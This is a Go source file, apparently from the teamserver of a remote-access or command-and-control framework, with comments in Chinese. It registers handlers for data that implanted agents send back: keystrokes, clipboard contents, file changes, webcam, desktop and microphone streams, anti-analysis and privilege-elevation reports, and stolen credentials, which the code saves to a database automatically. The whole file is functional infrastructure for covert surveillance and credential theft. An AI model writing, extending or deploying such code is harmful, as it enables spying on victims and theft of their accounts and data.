// Package handlers 业务命令处理: 处理 Agent 主动推送并转发到事件总线。
// 命令下发(push/pull)由 session 包提供; 本包负责把主动推送"翻译"成对外事件。
package handlers

import (
	"cleat/teamserver/internal/eventbus"
	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/session"
	"cleat/teamserver/internal/store"
)

// Registry 注册所有主动推送处理器到 Manager。
func Registry(mgr *session.Manager, bus *eventbus.Hub, st *store.Store) {
	// 主动推送 -> 事件总线(会话级事件, SSE 消费)
	pushes := map[string]string{
		session.CmdEventReport: eventbus.EventLog,
		"KeylogData":           eventbus.EventKeylog,
		"TerminalOutput":       eventbus.EventTerminalOutput,
		"FileDownloadData":     eventbus.EventFileDownload,
		"FileDownloadError":    eventbus.EventFileDownloadErr,
		"FileDownloadComplete": eventbus.EventFileDownloadDone,
		"FileUploadComplete":   eventbus.EventFileUploadDone,
		"FileUploadError":      eventbus.EventFileUploadErr,
		"AntiAnalysisReport":   eventbus.EventAntiAnalysis,
		"ElevationReport":      eventbus.EventElevation,
		"DiscoveryReport":      eventbus.EventDiscovery,
		"ClipboardData":        eventbus.EventClipboard,
		"FileChangeData":       eventbus.EventFileChange,
	}
	for cmd, evType := range pushes {
		mgr.RegisterHandler(cmd, makePushForwarder(evType, bus))
	}
	// 凭据: 同时转发事件 + 自动入库
	mgr.RegisterHandler("CredentialData", makeCredentialHandler(bus, st))
	// 流媒体混合帧(桌面/摄像头)与录音: 把二进制体放到 Web 预期的 image/audio 字段,
	// 并透传帧元数据(对齐旧 Server handlePushData)——否则前端读 data.image 为 undefined。
	mgr.RegisterHandler("AudioData", makeStreamForwarder(eventbus.EventAudioData, "audio", bus))
	mgr.RegisterHandler("CameraStreamData", makeStreamForwarder(eventbus.EventCameraStream, "image", bus))
	mgr.RegisterHandler("DesktopStreamData", makeStreamForwarder(eventbus.EventDesktopStream, "image", bus))
}

// makeCredentialHandler 构造凭据事件处理器: 转发 SSE 事件 + 自动入库。
func makeCredentialHandler(bus *eventbus.Hub, st *store.Store) session.HandlerFunc {
	return func(s *session.Session, cmd string, params map[string]interface{}, binary []byte) {
		data := params
		if binary != nil {
			if data == nil {
				data = map[string]interface{}{}
			}
			data["__binary__"] = binary
		}
		// 自动入库凭据
		if st != nil {
			username, _ := data["username"].(string)
			realm, _ := data["realm"].(string)
			credType, _ := data["type"].(string)
			secret, _ := data["secret"].(string)
			host, _ := data["host"].(string)
			source, _ := data["source"].(string)
			tag, _ := data["tag"].(string)
			if secret != "" || username != "" {
				st.SaveCredential(&store.Credential{
					Username: username,
					Realm:    realm,
					CredType: store.CredentialType(credType),
					Secret:   secret,
					Host:     host,
					Source:   source,
					AgentID:  s.ID(),
					Tag:      tag,
				})
				logx.Printf("[cred] 会话 #%d 凭据入库: %s@%s (%s)\n", s.ID(), username, host, credType)
			}
		}
		bus.PublishSession(s.ID(), eventbus.NewEvent(eventbus.EventCredential, s.ID(), data))
	}
}

// makePushForwarder 构造一个把 active push 转发为会话事件的 handler。
// makePushForwarder 构造一个把 active push 转发为会话事件的 handler。
// 结果型事件(有落盘/全局审计价值)同时镜像到全局总线: 前端 EventLogView 订阅
// /api/events(全局), eventlog 落盘消费者也订阅全局 —— 若只发布会话级,
// EventLog/Clipboard/FileChange 等在 EventLog 界面永远看不到、也从不落盘。
// 流型事件(键击/音频/摄像头/桌面/终端/下载块)量大且无回溯价值, 保持会话级。
var globalMirror = map[string]bool{
	eventbus.EventLog:              true,
	eventbus.EventClipboard:        true,
	eventbus.EventFileChange:       true,
	eventbus.EventCredential:       true,
	eventbus.EventAntiAnalysis:     true,
	eventbus.EventElevation:        true,
	eventbus.EventDiscovery:        true,
	eventbus.EventFileDownloadDone: true,
	eventbus.EventFileDownloadErr:  true,
	eventbus.EventFileUploadDone:   true,
	eventbus.EventFileUploadErr:    true,
}

func makePushForwarder(evType string, bus *eventbus.Hub) session.HandlerFunc {
	return func(s *session.Session, cmd string, params map[string]interface{}, binary []byte) {
		logx.Printf("[+] 会话 #%d 收到主动推送 %s -> %s (params=%d keys)\n",
			s.ID(), cmd, evType, len(params))
		data := params
		if binary != nil {
			if data == nil {
				data = map[string]interface{}{}
			}
			data["__binary__"] = binary
		}
		bus.PublishSession(s.ID(), eventbus.NewEvent(evType, s.ID(), data))
		if globalMirror[evType] {
			bus.PublishGlobal(eventbus.NewEvent(evType, s.ID(), data))
		}
	}
}

// streamMetaKeys 流帧需透传的元数据字段(全帧尺寸 / 差异帧坐标 / 块列表 / 音频参数等)。
var streamMetaKeys = []string{"type", "format", "width", "height", "x", "y", "w", "h", "block_size", "blocks",
	"sample_rate", "channels", "bits_per_sample", "body_size"}

// makeStreamForwarder 构造流媒体混合帧转发: params 元数据 + 二进制体放到 field(image/audio)。
// 无二进制(非帧消息)不发布, 对齐旧 Server handlePushData 的 size==0 跳过。
func makeStreamForwarder(evType, field string, bus *eventbus.Hub) session.HandlerFunc {
	return func(s *session.Session, cmd string, params map[string]interface{}, binary []byte) {
		if len(binary) == 0 {
			return
		}
		data := map[string]interface{}{}
		for _, k := range streamMetaKeys {
			if v, ok := params[k]; ok {
				data[k] = v
			}
		}
		// 二进制体(SSE JSON 序列化时 []byte 自动 base64)放到 Web 预期的 image/audio 字段
		data[field] = binary
		data["size"] = len(binary)
		bus.PublishSession(s.ID(), eventbus.NewEvent(evType, s.ID(), data))
	}
}
